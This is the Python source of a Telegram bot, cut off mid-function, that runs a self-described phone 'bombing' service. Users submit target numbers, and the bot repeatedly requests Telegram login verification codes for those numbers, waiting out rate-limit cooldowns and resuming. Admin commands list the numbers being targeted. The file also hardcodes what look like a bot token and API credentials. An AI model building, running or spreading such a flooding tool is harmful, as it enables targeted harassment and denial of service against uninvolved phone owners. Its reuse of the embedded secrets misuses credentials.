import asyncio
import logging
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ConversationHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient
from telethon.errors import FloodWaitError
from telethon.sessions import StringSession
import re
import sys
import os
from pathlib import Path
from typing import Dict, Optional, Set, List, Tuple
import json
import hashlib
import secrets
import base64

# ==================== Railway 环境配置 ====================
# 获取 Railway 提供的持久化存储路径
RAILWAY_VOLUME = os.environ.get('RAILWAY_VOLUME_MOUNT_PATH', '/app/data')
DATA_DIR = Path(RAILWAY_VOLUME)
DATA_DIR.mkdir(parents=True, exist_ok=True)

# 日志目录
LOG_DIR = DATA_DIR / 'logs'
LOG_DIR.mkdir(parents=True, exist_ok=True)

# ==================== 控制台输出重定向到文件 ====================
class TeeLogger:
    def __init__(self, filename):
        self.terminal = sys.stdout
        self.log_file = open(filename, 'a', encoding='utf-8')
        
    def write(self, message):
        self.terminal.write(message)
        self.log_file.write(message)
        self.log_file.flush()
        
    def flush(self):
        self.terminal.flush()
        self.log_file.flush()

class TeeErrorLogger:
    def __init__(self, filename):
        self.terminal = sys.stderr
        self.log_file = open(filename, 'a', encoding='utf-8')
        
    def write(self, message):
        self.terminal.write(message)
        self.log_file.write(message)
        self.log_file.flush()
        
    def flush(self):
        self.terminal.flush()
        self.log_file.flush()

start_time_log = datetime.now().strftime("%Y%m%d_%H%M%S")
log_filename = LOG_DIR / f"bomb_console_{start_time_log}.txt"
error_log_filename = LOG_DIR / f"bomb_error_{start_time_log}.txt"

sys.stdout = TeeLogger(log_filename)
sys.stderr = TeeErrorLogger(error_log_filename)

print("=" * 70)
print(f"轰炸机器人启动时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print(f"数据目录: {DATA_DIR}")
print(f"日志目录: {LOG_DIR}")
print("=" * 70)
print()

# ==================== 配置区域 ====================
BOT_TOKEN = "8762127150:AAGsz59y5kIhARE_Yg1WYYH_GkfTZOSnOqI"
API_ID = 33059943
API_HASH = '1c73a0510ba0b8cb3bd16f24acfd62bf'
PROXY = None
USE_PROXY_ROTATOR = False

# 频道验证配置
REQUIRED_CHANNEL = "@dhs_db8"
REQUIRED_CHANNEL_ID = -1003742038692
ADMIN_ID = 8723942642

# 用户最大并发任务数
MAX_TASKS_PER_USER = 3
MAX_CONCURRENT_TASKS = 15

# 状态定义
PHONE_NUMBER = 1

# 存储被禁用的用户
banned_users: Set[int] = set()
BANNED_USERS_FILE = DATA_DIR / "banned_users.json"

# 任务存储结构: task_id -> TaskData
class TaskData:
    def __init__(self, task_id: str, phone_number: str, user_id: int, chat_id: int):
        self.task_id = task_id
        self.phone_number = phone_number
        self.user_id = user_id
        self.chat_id = chat_id
        self.task: Optional[asyncio.Task] = None
        self.start_time = datetime.now()
        self.success_count = 0
        self.fail_count = 0
        self.cooldown_until: Optional[datetime] = None
        self.is_running = True
        self.is_stopped = False
        self._lock = asyncio.Lock()
        self._stop_event = asyncio.Event()
        
    def get_status(self) -> Dict:
        elapsed = (datetime.now() - self.start_time).total_seconds()
        return {
            "task_id": self.task_id,
            "phone": self.phone_number,
            "success": self.success_count,
            "fail": self.fail_count,
            "elapsed": elapsed,
            "is_running": self.is_running,
            "is_stopped": self.is_stopped,
            "cooldown": self.cooldown_until
        }
    
    def get_display_status(self) -> str:
        if self.is_stopped:
            return "⏸ 已停止"
        if self.cooldown_until and self.cooldown_until > datetime.now():
            remaining = (self.cooldown_until - datetime.now()).total_seconds()
            if remaining >= 3600:
                return f"⏳ 冷却 ({remaining/3600:.1f}h)"
            elif remaining >= 60:
                return f"⏳ 冷却 ({remaining/60:.0f}m)"
            else:
                return f"⏳ 冷却 ({remaining:.0f}s)"
        elif self.is_running:
            return "🔥 轰炸中"
        else:
            return "⏸ 已停止"
    
    async def stop(self):
        async with self._lock:
            self.is_running = False
            self.is_stopped = True
            self._stop_event.set()
        
    async def start(self):
        async with self._lock:
            self.is_running = True
            self.is_stopped = False
            self._stop_event.clear()
        
    async def is_active(self) -> bool:
        async with self._lock:
            if self.is_stopped:
                return False
            if not self.is_running:
                return False
            if self.cooldown_until and self.cooldown_until > datetime.now():
                return False
            return True
    
    async def wait_for_stop(self, timeout: float = None):
        """等待停止信号"""
        try:
            await asyncio.wait_for(self._stop_event.wait(), timeout)
            return True
        except asyncio.TimeoutError:
            return False

# 全局锁
_tasks_lock = asyncio.Lock()
_user_tasks_lock = asyncio.Lock()

# 任务存储: task_id -> TaskData
active_tasks: Dict[str, TaskData] = {}

# 手机号到任务ID的映射（用于快速查找）
phone_to_task_id: Dict[str, str] = {}

# 用户任务列表: user_id -> List[task_id]
user_tasks: Dict[int, List[str]] = {}

# 会话token存储（使用短token）
session_tokens: Dict[int, str] = {}
_session_tokens_lock = asyncio.Lock()

# 全局统计
stats = {
    "total_requests": 0,
    "total_success": 0,
    "total_fails": 0,
    "start_time": datetime.now()
}
stats_lock = asyncio.Lock()

# 存储面板消息ID (每个用户单独存储)
panel_messages: Dict[int, int] = {}
_panel_messages_lock = asyncio.Lock()

# 用户使用记录
user_usage: Dict[int, Dict] = {}
USER_USAGE_FILE = DATA_DIR / "user_usage.json"

# 全局应用实例
application = None

# ==================== 辅助函数 ====================
def generate_task_id() -> str:
    """生成唯一的任务ID（使用base64缩短）"""
    return base64.b64encode(secrets.token_bytes(8)).decode('ascii').rstrip('=')

async def generate_session_token(user_id: int) -> str:
    """为每个用户生成会话token（短token）"""
    token = base64.b64encode(secrets.token_bytes(6)).decode('ascii').rstrip('=')
    async with _session_tokens_lock:
        session_tokens[user_id] = token
    return token

async def verify_session_token(user_id: int, token: str) -> bool:
    """验证会话token"""
    async with _session_tokens_lock:
        return session_tokens.get(user_id) == token

def print_log(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_msg = f"[{timestamp}] [{level}] {message}"
    print(log_msg)

def format_flood_time(seconds):
    if seconds >= 86400:
        return f"{seconds//86400}天"
    elif seconds >= 3600:
        return f"{seconds//3600}小时"
    elif seconds >= 60:
        return f"{seconds//60}分钟"
    else:
        return f"{seconds}秒"

async def get_task_management_keyboard(user_id: int, user_task_ids: List[str]) -> InlineKeyboardMarkup:
    """获取任务管理键盘 - 使用安全的回调数据"""
    keyboard = []
    
    # 生成会话token
    token = await generate_session_token(user_id)
    
    for idx, task_id in enumerate(user_task_ids, 1):
        task_data = active_tasks.get(task_id)
        if task_data and task_data.user_id == user_id:
            display_phone = task_data.phone_number
            if len(display_phone) > 15:
                display_phone = f"{display_phone[:4]}...{display_phone[-6:]}"
            
            if task_data.is_stopped:
                keyboard.append([
                    InlineKeyboardButton(f"▶️ 启动 #{idx} ({display_phone})", callback_data=f"rs_{task_id}_{token}"),
                    InlineKeyboardButton(f"🗑️ 删除 #{idx}", callback_data=f"dl_{task_id}_{token}")
                ])
            else:
                keyboard.append([
                    InlineKeyboardButton(f"⏸ 停止 #{idx} ({display_phone})", callback_data=f"sp_{task_id}_{token}"),
                    InlineKeyboardButton(f"🗑️ 删除 #{idx}", callback_data=f"dl_{task_id}_{token}")
                ])
    
    keyboard.append([InlineKeyboardButton("➕ 增加配额", callback_data=f"aq_{token}")])
    keyboard.append([InlineKeyboardButton("📋 系统日志", callback_data=f"vl_{token}")])
    keyboard.append([InlineKeyboardButton("🔄 刷新面板", callback_data=f"rf_{token}")])
    keyboard.append([InlineKeyboardButton("📊 详细统计", callback_data=f"ds_{token}")])
    
    return InlineKeyboardMarkup(keyboard)

def format_panel_text(user_id: int) -> str:
    """格式化面板文本 - 只显示用户自己的任务"""
    user_task_ids = user_tasks.get(user_id, [])
    
    # 统计用户的任务状态
    active_count = 0
    stopped_count = 0
    total_success = 0
    total_fail = 0
    
    for task_id in user_task_ids:
        task_data = active_tasks.get(task_id)
        if task_data:
            if task_data.is_running and not task_data.is_stopped:
                active_count += 1
            elif task_data.is_stopped:
                stopped_count += 1
            total_success += task_data.success_count
            total_fail += task_data.fail_count
    
    total_count = len(user_task_ids)
    
    text = (
        "💎 欢迎使用 Telegram 账号轰炸系统(此版本为公益共享版)\n"
        "──────────────────────\n"
        f"本版本永久承诺1分钱不收请关注创作者 https://t.me/dhs_db8\n"
        f"📟 系统状态: 在线 (v3.8 作者 @TCYP0807)\n"
        f"📊 您的任务: {active_count} / {MAX_TASKS_PER_USER}\n"
        f"📋 总任务数: {total_count} (活跃: {active_count} | 停止: {stopped_count})\n\n"
    )
    
    if user_task_ids:
        text += "[ 您的任务矩阵 ]\n"
        for idx, task_id in enumerate(user_task_ids, 1):
            task_data = active_tasks.get(task_id)
            if task_data:
                status = task_data.get_display_status()
                display_phone = task_data.phone_number
                if len(display_phone) > 15:
                    display_phone = f"{display_phone[:4]}...{display_phone[-6:]}"
                text += f"#{idx} | {display_phone} | {status}"
                
                if task_data.success_count > 0:
                    text += f" | ✅ {task_data.success_count}"
                if task_data.fail_count > 0:
                    text += f" | ❌ {task_data.fail_count}"
                text += "\n"
    else:
        text += "[ 您的任务矩阵 ]\n"
        text += "暂无任务，请点击「增加配额」添加\n"
    
    text += "\n──────────────────────"
    
    # 系统统计
    elapsed = (datetime.now() - stats["start_time"]).total_seconds()
    text += f"\n📊 系统统计:\n"
    text += f"• 运行时间: {elapsed/3600:.1f} 小时\n"
    text += f"• 总请求: {stats['total_requests']}\n"
    text += f"• 成功: {stats['total_success']} | 失败: {stats['total_fails']}\n"
    if stats['total_requests'] > 0:
        success_rate = (stats['total_success']/stats['total_requests']*100)
        text += f"• 成功率: {success_rate:.1f}%\n"
    else:
        text += f"• 成功率: 0%\n"
    
    return text

async def update_panel(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    """更新控制面板"""
    panel_text = format_panel_text(user_id)
    user_task_ids = user_tasks.get(user_id, [])
    
    try:
        async with _panel_messages_lock:
            if user_id in panel_messages:
                try:
                    await context.bot.edit_message_text(
                        chat_id=user_id,
                        message_id=panel_messages[user_id],
                        text=panel_text,
                        reply_markup=await get_task_management_keyboard(user_id, user_task_ids)
                    )
                    return
                except Exception as e:
                    print_log(f"编辑面板消息失败: {e}", "DEBUG")
                    if "message to edit not found" in str(e) or "Message can't be edited" in str(e):
                        if user_id in panel_messages:
                            del panel_messages[user_id]
            
            message = await context.bot.send_message(
                chat_id=user_id,
                text=panel_text,
                reply_markup=await get_task_management_keyboard(user_id, user_task_ids)
            )
            panel_messages[user_id] = message.message_id
    except Exception as e:
        print_log(f"更新面板失败: {e}", "ERROR")

# ==================== 数据持久化 ====================
def load_banned_users():
    global banned_users
    try:
        if BANNED_USERS_FILE.exists():
            with open(BANNED_USERS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                banned_users = set(data.get("banned_users", []))
            print_log(f"加载禁用用户列表: {len(banned_users)} 个用户")
    except Exception as e:
        print_log(f"加载禁用用户列表失败: {e}", "ERROR")

def save_banned_users():
    try:
        with open(BANNED_USERS_FILE, 'w', encoding='utf-8') as f:
            json.dump({"banned_users": list(banned_users)}, f, ensure_ascii=False, indent=2)
        print_log(f"保存禁用用户列表: {len(banned_users)} 个用户")
    except Exception as e:
        print_log(f"保存禁用用户列表失败: {e}", "ERROR")

def load_user_usage():
    global user_usage
    try:
        if USER_USAGE_FILE.exists():
            with open(USER_USAGE_FILE, 'r', encoding='utf-8') as f:
                user_usage = json.load(f)
                user_usage = {int(k): v for k, v in user_usage.items()}
            print_log(f"加载用户使用记录: {len(user_usage)} 个用户")
    except Exception as e:
        print_log(f"加载用户使用记录失败: {e}", "ERROR")

def save_user_usage():
    try:
        with open(USER_USAGE_FILE, 'w', encoding='utf-8') as f:
            json.dump(user_usage, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print_log(f"保存用户使用记录失败: {e}", "ERROR")

async def save_user_tasks():
    """保存用户任务列表"""
    try:
        tasks_file = DATA_DIR / "user_tasks.json"
        async with _user_tasks_lock:
            data = {str(k): v for k, v in user_tasks.items()}
        with open(tasks_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        print_log(f"保存用户任务列表: {len(user_tasks)} 个用户")
    except Exception as e:
        print_log(f"保存用户任务列表失败: {e}", "ERROR")

def load_user_tasks():
    """加载用户任务列表"""
    global user_tasks
    try:
        tasks_file = DATA_DIR / "user_tasks.json"
        if tasks_file.exists():
            with open(tasks_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
                user_tasks = {int(k): v for k, v in data.items()}
            print_log(f"加载用户任务列表: {len(user_tasks)} 个用户")
    except Exception as e:
        print_log(f"加载用户任务列表失败: {e}", "ERROR")

async def save_active_tasks():
    """保存活跃任务信息（用于恢复）"""
    try:
        tasks_data_file = DATA_DIR / "active_tasks.json"
        data = {}
        async with _tasks_lock:
            for task_id, task_data in active_tasks.items():
                data[task_id] = {
                    "task_id": task_id,
                    "phone_number": task_data.phone_number,
                    "user_id": task_data.user_id,
                    "chat_id": task_data.chat_id,
                    "success_count": task_data.success_count,
                    "fail_count": task_data.fail_count,
                    "is_stopped": task_data.is_stopped
                }
        with open(tasks_data_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print_log(f"保存活跃任务失败: {e}", "ERROR")

# ==================== 频道验证函数 ====================
async def check_channel_membership(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    try:
        chat_member = await context.bot.get_chat_member(
            chat_id=REQUIRED_CHANNEL, 
            user_id=user_id
        )
        return chat_member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        print_log(f"检查频道成员资格失败 (用户 {user_id}): {e}", "DEBUG")
        return False

# ==================== 管理员功能 ====================
def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID

async def gfh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """查看机器人使用用户 - 管理员指令"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 权限不足！只有管理员可以使用此命令。")
        return
    
    users_info = []
    for uid, usage in user_usage.items():
        users_info.append({
            "id": uid,
            "first_name": usage.get("first_name", "未知"),
            "username": usage.get("username", "无"),
            "last_active": usage.get("last_active", "未知"),
            "total_tasks": usage.get("total_tasks", 0),
            "active_tasks": len(user_tasks.get(uid, []))
        })
    
    if not users_info:
        await update.message.reply_text("📊 暂无用户使用记录")
        return
    
    text = "📊 **用户使用统计**\n\n"
    for idx, user in enumerate(users_info, 1):
        text += f"{idx}. **{user['first_name']}**\n"
        text += f"   ID: `{user['id']}`\n"
        text += f"   用户名: @{user['username'] if user['username'] != '无' else '无'}\n"
        text += f"   最后使用: {user['last_active']}\n"
        text += f"   总任务数: {user['total_tasks']} | 活跃: {user['active_tasks']}\n\n"
        
        if len(text) > 3500:
            await update.message.reply_text(text, parse_mode="Markdown")
            text = ""
    
    if text:
        await update.message.reply_text(text, parse_mode="Markdown")

async def gfd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """禁止某个用户使用 - 管理员指令"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 权限不足！只有管理员可以使用此命令。")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ 使用方法:\n"
            "/gfd <用户ID> - 禁止用户使用\n"
            "/gfd @username - 禁止用户使用\n\n"
            "示例:\n"
            "/gfd 123456789\n"
            "/gfd @username"
        )
        return
    
    target = args[0]
    target_user_id = None
    
    if target.isdigit():
        target_user_id = int(target)
    elif target.startswith('@'):
        try:
            chat = await context.bot.get_chat(target)
            target_user_id = chat.id
        except Exception as e:
            await update.message.reply_text(f"❌ 无法找到用户: {target}\n错误: {str(e)}")
            return
    
    if target_user_id is None:
        await update.message.reply_text("❌ 无效的用户标识")
        return
    
    if target_user_id == ADMIN_ID:
        await update.message.reply_text("❌ 不能禁止管理员自己！")
        return
    
    banned_users.add(target_user_id)
    save_banned_users()
    
    # 停止该用户的所有任务
    if target_user_id in user_tasks:
        for task_id in user_tasks[target_user_id][:]:
            if task_id in active_tasks:
                task_data = active_tasks[task_id]
                await task_data.stop()
                if task_data.task and not task_data.task.done():
                    task_data.task.cancel()
                if task_data.phone_number in phone_to_task_id:
                    del phone_to_task_id[task_data.phone_number]
                del active_tasks[task_id]
        user_tasks[target_user_id] = []
        await save_user_tasks()
        await save_active_tasks()
    
    await update.message.reply_text(
        f"✅ 已禁止用户 ID: {target_user_id}\n"
        f"该用户将无法使用机器人，已停止其所有任务"
    )
    
    try:
        await context.bot.send_message(
            chat_id=target_user_id,
            text="🚫 您已被管理员禁止使用此机器人！您的所有任务已被停止。"
        )
    except:
        pass

async def unfd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """解除禁止用户 - 管理员指令"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 权限不足！只有管理员可以使用此命令。")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ 使用方法:\n"
            "/unfd <用户ID> - 解除禁止用户\n\n"
            "示例:\n"
            "/unfd 123456789"
        )
        return
    
    target = args[0]
    target_user_id = int(target) if target.isdigit() else None
    
    if target_user_id is None:
        await update.message.reply_text("❌ 请输入有效的用户ID")
        return
    
    if target_user_id in banned_users:
        banned_users.remove(target_user_id)
        save_banned_users()
        await update.message.reply_text(f"✅ 已解除禁止用户 ID: {target_user_id}")
    else:
        await update.message.reply_text(f"❌ 用户 ID: {target_user_id} 不在禁用列表中")

async def gfhl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """查看被禁用的用户列表 - 管理员指令"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 权限不足！只有管理员可以使用此命令。")
        return
    
    if not banned_users:
        await update.message.reply_text("📊 暂无被禁用的用户")
        return
    
    text = "🚫 **被禁用的用户列表**\n\n"
    for idx, uid in enumerate(banned_users, 1):
        text += f"{idx}. ID: `{uid}`\n"
        if uid in user_usage:
            text += f"   用户: {user_usage[uid].get('first_name', '未知')}\n"
        
        if len(text) > 3500:
            await update.message.reply_text(text, parse_mode="Markdown")
            text = ""
    
    if text:
        await update.message.reply_text(text, parse_mode="Markdown")

async def stats_all_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """查看全系统统计 - 管理员指令"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 权限不足！只有管理员可以使用此命令。")
        return
    
    total_users = len(user_usage)
    active_users = len(set([t.user_id for t in active_tasks.values() if t.is_running and not t.is_stopped]))
    total_active_tasks = len([t for t in active_tasks.values() if t.is_running and not t.is_stopped])
    
    text = (
        "📊 **系统全局统计**\n"
        "──────────────────────\n"
        f"📈 总用户数: {total_users}\n"
        f"🔥 活跃用户: {active_users}\n"
        f"📋 全局活跃任务: {total_active_tasks}/{MAX_CONCURRENT_TASKS}\n"
        f"🚫 被禁用户: {len(banned_users)}\n\n"
        f"📊 系统请求:\n"
        f"• 总请求: {stats['total_requests']}\n"
        f"• 成功: {stats['total_success']}\n"
        f"• 失败: {stats['total_fails']}\n"
    )
    
    if stats['total_requests'] > 0:
        success_rate = (stats['total_success']/stats['total_requests']*100)
        text += f"• 成功率: {success_rate:.1f}%\n\n"
    
    text += f"⏰ 运行时间: {(datetime.now() - stats['start_time']).total_seconds()/3600:.1f} 小时"
    
    await update.message.reply_text(text, parse_mode="Markdown")

# ==================== 新增管理员指令 ====================

async def dz_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """查看当前被轰炸的手机列表 - 管理员指令"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 权限不足！只有管理员可以使用此命令。")
        return
    
    if not active_tasks:
        await update.message.reply_text("📊 当前没有正在轰炸的手机号")
        return
    
    # 统计正在活跃的任务
    active_list = []
    cooling_list = []
    stopped_list = []
    
    for task_id, task_data in active_tasks.items():
        if task_data.is_stopped:
            stopped_list.append({
                "phone": task_data.phone_number,
                "user_id": task_data.user_id,
                "success": task_data.success_count,
                "fail": task_data.fail_count,
                "task_id": task_id
            })
        elif task_data.cooldown_until and task_data.cooldown_until > datetime.now():
            remaining = (task_data.cooldown_until - datetime.now()).total_seconds()
            cooling_list.append({
                "phone": task_data.phone_number,
                "user_id": task_data.user_id,
                "remaining": remaining,
                "success": task_data.success_count,
                "fail": task_data.fail_count,
                "task_id": task_id
            })
        else:
            active_list.append({
                "phone": task_data.phone_number,
                "user_id": task_data.user_id,
                "success": task_data.success_count,
                "fail": task_data.fail_count,
                "task_id": task_id
            })
    
    text = "📱 **当前被轰炸的手机列表**\n"
    text += "──────────────────────\n\n"
    
    # 活跃中的任务
    text += f"🔥 **活跃中** ({len(active_list)}个):\n"
    if active_list:
        for idx, item in enumerate(active_list, 1):
            user_info = user_usage.get(item["user_id"], {})
            user_name = user_info.get("first_name", f"用户{item['user_id']}")
            text += f"{idx}. `{item['phone']}`\n"
            text += f"   👤 发起者: {user_name} (ID: `{item['user_id']}`)\n"
            text += f"   📊 成功: {item['success']} | 失败: {item['fail']}\n"
            text += f"   🆔 任务ID: `{item['task_id'][:8]}...`\n\n"
    else:
        text += "   暂无活跃任务\n\n"
    
    # 冷却中的任务
    text += f"⏳ **冷却中** ({len(cooling_list)}个):\n"
    if cooling_list:
        for idx, item in enumerate(cooling_list, 1):
            user_info = user_usage.get(item["user_id"], {})
            user_name = user_info.get("first_name", f"用户{item['user_id']}")
            remaining_min = item["remaining"] / 60
            text += f"{idx}. `{item['phone']}`\n"
            text += f"   👤 发起者: {user_name} (ID: `{item['user_id']}`)\n"
            text += f"   ⏰ 剩余冷却: {remaining_min:.1f}分钟\n"
            text += f"   📊 成功: {item['success']} | 失败: {item['fail']}\n"
            text += f"   🆔 任务ID: `{item['task_id'][:8]}...`\n\n"
    else:
        text += "   暂无冷却任务\n\n"
    
    # 已停止的任务
    text += f"⏸ **已停止** ({len(stopped_list)}个):\n"
    if stopped_list:
        for idx, item in enumerate(stopped_list, 1):
            user_info = user_usage.get(item["user_id"], {})
            user_name = user_info.get("first_name", f"用户{item['user_id']}")
            text += f"{idx}. `{item['phone']}`\n"
            text += f"   👤 发起者: {user_name} (ID: `{item['user_id']}`)\n"
            text += f"   📊 成功: {item['success']} | 失败: {item['fail']}\n"
            text += f"   🆔 任务ID: `{item['task_id'][:8]}...`\n\n"
    else:
        text += "   暂无停止任务\n"
    
    text += "──────────────────────\n"
    text += f"📊 总计: {len(active_tasks)} 个任务"
    
    # 分页发送
    if len(text) > 4000:
        parts = []
        current_part = ""
        for line in text.split('\n'):
            if len(current_part) + len(line) + 1 > 4000:
                parts.append(current_part)
                current_part = line
            else:
                current_part += line + '\n'
        if current_part:
            parts.append(current_part)
        
        for i, part in enumerate(parts, 1):
            await update.message.reply_text(part, parse_mode="Markdown")
    else:
        await update.message.reply_text(text, parse_mode="Markdown")

async def tz_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """停止被轰炸的手机并从列表中删除 - 管理员指令"""
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ 权限不足！只有管理员可以使用此命令。")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text(
            "❌ 使用方法:\n"
            "/tz <手机号> - 停止轰炸指定手机号\n\n"
            "示例:\n"
            "/tz +8613800138000\n\n"
            "💡 提示: 可以使用 /dz 查看所有正在轰炸的手机号"
        )
        return
    
    phone_number = args[0]
    
    # 验证手机号格式
    if not re.match(r'^\+\d{7,15}$', phone_number):
        await update.message.reply_text(
            "❌ 手机号格式错误！\n"
            "正确格式: +8613800138000\n\n"
            "💡 提示: 可以使用 /dz 查看所有正在轰炸的手机号"
        )
        return
    
    # 查找任务
    if phone_number not in phone_to_task_id:
        await update.message.reply_text(
            f"❌ 未找到手机号 {phone_number} 的轰炸任务\n\n"
            f"💡 提示: 可以使用 /dz 查看所有正在轰炸的手机号"
        )
        return
    
    task_id = phone_to_task_id[phone_number]
    task_data = active_tasks.get(task_id)
    
    if not task_data:
        await update.message.reply_text(f"❌ 任务数据异常，请稍后重试")
        return
    
    # 获取任务所属用户信息
    target_user_id = task_data.user_id
    user_info = user_usage.get(target_user_id, {})
    user_name = user_info.get("first_name", f"用户{target_user_id}")
    
    # 停止并删除任务
    if task_data.task and not task_data.task.done():
        task_data.task.cancel()
        try:
            await task_data.task
        except asyncio.CancelledError:
            pass
    
    # 从用户任务列表中移除
    if target_user_id in user_tasks and task_id in user_tasks[target_user_id]:
        user_tasks[target_user_id].remove(task_id)
        await save_user_tasks()
    
    # 清理映射
    del phone_to_task_id[phone_number]
    del active_tasks[task_id]
    
    print_log(f"管理员 {user_id} 停止了手机号 {phone_number} 的轰炸任务 (发起者: {target_user_id})", "INFO")
    
    # 通知发起者
    try:
        await context.bot.send_message(
            chat_id=target_user_id,
            text=f"⚠️ 管理员已停止您的轰炸任务\n"
                 f"📱 手机号: {phone_number}\n"
                 f"📊 最终统计: 成功 {task_data.success_count} | 失败 {task_data.fail_count}\n\n"
                 f"如需继续使用，请重新添加任务。"
        )
    except Exception as e:
        print_log(f"通知用户 {target_user_id} 失败: {e}", "DEBUG")
    
    await update.message.reply_text(
        f"✅ 已停止轰炸并删除任务\n\n"
        f"📱 手机号: `{phone_number}`\n"
        f"👤 发起者: {user_name} (ID: `{target_user_id}`)\n"
        f"📊 最终统计: 成功 {task_data.success_count} | 失败 {task_data.fail_count}",
        parse_mode="Markdown"
    )

# ==================== 核心轰炸功能 ====================
async def send_verification_fast(phone_number):
    """快速发送验证码请求"""
    temp_client = None
    try:
        print_log(f"发送验证码到 {phone_number}", "DEBUG")
        
        if PROXY:
            temp_client = TelegramClient(
                StringSession(),
                API_ID,
                API_HASH,
                proxy=PROXY,
                timeout=10
            )
        else:
            temp_client = TelegramClient(
                StringSession(),
                API_ID,
                API_HASH,
                timeout=10
            )
        
        await temp_client.connect()
        await temp_client.send_code_request(phone_number)
        await temp_client.disconnect()
        
        async with stats_lock:
            stats["total_requests"] += 1
            stats["total_success"] += 1
        
        return True, "成功", 0
        
    except FloodWaitError as e:
        print_log(f"⚠️ {phone_number} 触发限制，等待 {e.seconds}秒", "WARNING")
        async with stats_lock:
            stats["total_requests"] += 1
            stats["total_fails"] += 1
        return False, "限制", e.seconds
        
    except Exception as e:
        print_log(f"❌ 发送失败 {phone_number}: {str(e)}", "ERROR")
        async with stats_lock:
            stats["total_requests"] += 1
            stats["total_fails"] += 1
        return False, f"错误", 0
    
    finally:
        if temp_client and temp_client.is_connected():
            try:
                await temp_client.disconnect()
            except:
                pass

async def bomb_phone_number(task_id: str, user_id: int, context: ContextTypes.DEFAULT_TYPE):
    """持续轰炸手机号"""
    while True:
        if task_id not in active_tasks:
            print_log(f"任务 {task_id} 已不存在，退出轰炸循环", "DEBUG")
            break
        
        task_data = active_tasks[task_id]
        
        if user_id in banned_users:
            print_log(f"用户 {user_id} 已被禁用，停止任务 {task_data.phone_number}", "WARNING")
            break
        
        if await task_data.wait_for_stop(0.5):
            print_log(f"任务 {task_data.phone_number} 收到停止信号", "DEBUG")
            await asyncio.sleep(0.5)
            continue
        
        if not await task_data.is_active():
            await asyncio.sleep(1)
            continue
        
        if task_data.cooldown_until and task_data.cooldown_until > datetime.now():
            remaining = (task_data.cooldown_until - datetime.now()).total_seconds()
            if remaining > 0:
                wait_time = min(remaining, 60)
                await asyncio.sleep(wait_time)
                continue
        
        try:
            success, message, wait_time = await send_verification_fast(task_data.phone_number)
            
            if success:
                task_data.success_count += 1
                
                if task_data.success_count % 30 == 0:
                    await update_panel(user_id, context)
                
                await asyncio.sleep(0.05)
                
            else:
                task_data.fail_count += 1
                if "限制" in message and wait_time > 0:
                    task_data.cooldown_until = datetime.now() + timedelta(seconds=wait_time)
                    
                    async with task_data._lock:
                        task_data.is_running = False
                    
                    print_log(f"⏸️ {task_data.phone_number} 进入冷却，{wait_time}秒", "WARNING")
                    
                    try:
                        await context.bot.send_message(
                            chat_id=user_id,
                            text=f"⚠️ {task_data.phone_number}\n触发限制，冷却 {format_flood_time(wait_time)}"
                        )
                    except Exception as e:
                        print_log(f"发送冷却通知失败: {e}", "DEBUG")
                    
                    await update_panel(user_id, context)
                    
                    if wait_time < 86400:
                        await asyncio.sleep(wait_time)
                        if task_id in active_tasks and not active_tasks[task_id].is_stopped:
                            if user_id not in banned_users:
                                async with active_tasks[task_id]._lock:
                                    active_tasks[task_id].is_running = True
                                    active_tasks[task_id].cooldown_until = None
                                print_log(f"🔄 {task_data.phone_number} 冷却结束，继续轰炸", "INFO")
                                try:
                                    await context.bot.send_message(
                                        chat_id=user_id,
                                        text=f"✅ {task_data.phone_number} 冷却结束，继续轰炸"
                                    )
                                except:
                                    pass
                                await update_panel(user_id, context)
                    else:
                        print_log(f"🎉 {task_data.phone_number} 达到24小时限制！", "INFO")
                        break
            
        except asyncio.CancelledError:
            print_log(f"🛑 {task_data.phone_number} 轰炸任务被取消", "WARNING")
            break
        except Exception as e:
            task_data.fail_count += 1
            print_log(f"❌ 轰炸错误 {task_data.phone_number}: {str(e)}", "ERROR")
            await asyncio.sleep(0.5)

# ==================== Bot命令处理 ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """启动命令 - 显示主面板（需要验证）"""
    user = update.effective_user
    user_id = user.id
    
    user_usage[user_id] = {
        "first_name": user.first_name,
        "username": user.username,
        "last_active": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "total_tasks": user_usage.get(user_id, {}).get("total_tasks", 0)
    }
    save_user_usage()
    
    print_log(f"用户 {user_id} ({user.first_name}) 启动了机器人")
    
    if user_id == ADMIN_ID:
        panel_text = format_panel_text(user_id)
        user_task_ids = user_tasks.get(user_id, [])
        message = await update.message.reply_text(
            panel_text,
